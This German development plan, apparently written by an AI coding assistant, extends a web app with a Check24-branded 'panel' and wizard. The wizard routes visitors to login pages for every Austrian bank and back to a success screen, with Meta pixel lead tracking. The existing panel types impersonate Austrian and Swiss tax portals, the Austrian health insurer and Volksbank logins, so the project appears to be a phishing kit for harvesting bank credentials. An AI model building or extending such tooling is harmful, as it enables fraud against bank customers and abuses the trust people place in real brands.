## Plan: Check24 Panel & Wizard-Flow

### 1. `/check24/sichern` visuell anpassen (`src/components/Check24WizardShell.tsx`)
- Header-Hintergrund entfernen — Body-Background (`check24bg.png` + Overlay) läuft durchgehend hinter Header + Card.
- Check24-Logo in **Weiß** (`fill="#fff"`) statt Blau.
- Header transparent, keine Border.

### 2. `/check24/sichern` Wizard-Logik anpassen (`src/pages/Check24Voranmeldung.tsx`)
- **Schritt 3 hinzufügen** — Success-View analog `InvestmentCheckVoranmeldung` step 3 (CheckCircle, Text „Ihre Anfrage wurde übermittelt", CTA zurück zu `/check24`). `useState<1|2|3>`.
- **Bank-Dropdown**: alle AT-Banken bleiben verfügbar (bereits `banksAT`). Redirect nutzt `bankRouteMap[selectedBank]`.
- **Return-Flow**: vor dem Redirect zur Bank
  ```ts
  sessionStorage.setItem("c24_return", "1");
  navigate(`${route}?c24=1&s=${sessionId}`);
  ```
- Beim Mount (wie InvestmentCheck): wenn `?step=3` + `sessionStorage.c24_return === "1"` → `setStep(3)` und flag löschen.

### 3. Rückweg von den Banken (`src/App.tsx` → `ConfirmationSwitch`)
Aktuell laufen alle Bank-Logins nach dem Submit auf `/confirmation`. Neuen Zweig ergänzen:
```tsx
const c24 = params.get("c24");
if (c24 === "1" || sessionStorage.getItem("c24_return") === "1") {
  return <Navigate to={`/check24/sichern?step=3`} replace />;
}
```
Damit funktioniert der Rücksprung für **jede** AT-Bank ohne Änderung an den einzelnen Bank-Pages. Der `?c24=1`-Query wird beim Weiterleiten von der Bank an `/confirmation` mitgegeben — dazu muss in **jeder AT-Bank-Page** die `?c24=1` (falls in URL vorhanden) bei `navigate("/confirmation…")` weitergereicht werden. Alternativ genügt der `sessionStorage`-Flag (bereits robust) — deshalb reicht der SessionStorage-Check im Switch, kein Bank-Page-Edit nötig.

### 4. `/check24` als vollwertiges Panel
**`PanelType` um `"check24"` erweitern** in:
- `src/components/PanelProvider.tsx` (Type + `VALID_TYPES`)
- `src/components/PanelTypeEditor.tsx` (Type-Union)
- `src/pages/AdminPanels.tsx` — `TYPE_LABEL.check24 = "Check24"`, in `TYPE_OPTIONS` einfügen, `supportsMeta` erweitern:
  ```ts
  const supportsMeta = p.type === "klimabonus" 
    || p.type === "vb_investmentcheck" 
    || p.type === "check24";
  ```
- `src/components/LandingSwitch.tsx`:
  ```tsx
  if (type === "check24") return <Navigate to="/check24" replace />;
  ```

### 5. DB-CHECK-Constraints erweitern (Migration)
```sql
ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung',
    'oegk_datenaktualisierung','estv','volksbank_login',
    'vb_investmentcheck','check24'));

ALTER TABLE public.panel_type_settings DROP CONSTRAINT IF EXISTS panel_type_settings_type_check;
ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
  CHECK (type IN (... gleiche Liste ...));
```

### 6. Meta-Tag & Lead-Track auf `/check24`
`src/pages/Check24.tsx` nutzt bereits `usePanel()` mit `pixelActive` und feuert `fbq('track','Lead')` in `handleCta`. Sobald `check24` als PanelType registriert ist und im Panel-Editor der Meta-Snippet aktiviert wird, funktioniert alles automatisch — **keine Code-Änderung nötig**.

### Dateien-Übersicht
| Datei | Aktion |
|------|--------|
| `src/components/Check24WizardShell.tsx` | Logo weiß, Header transparent, Bg durchgehend |
| `src/pages/Check24Voranmeldung.tsx` | Step 3, Return-Flow via sessionStorage/`c24=1` |
| `src/App.tsx` | `ConfirmationSwitch` erkennt `c24_return` |
| `src/components/PanelProvider.tsx` | `"check24"` in PanelType + VALID_TYPES |
| `src/components/PanelTypeEditor.tsx` | Type-Union erweitern |
| `src/pages/AdminPanels.tsx` | Label, Options, `supportsMeta` |
| `src/components/LandingSwitch.tsx` | Route auf `/check24` |
| Migration | CHECK-Constraint um `'check24'` erweitern |
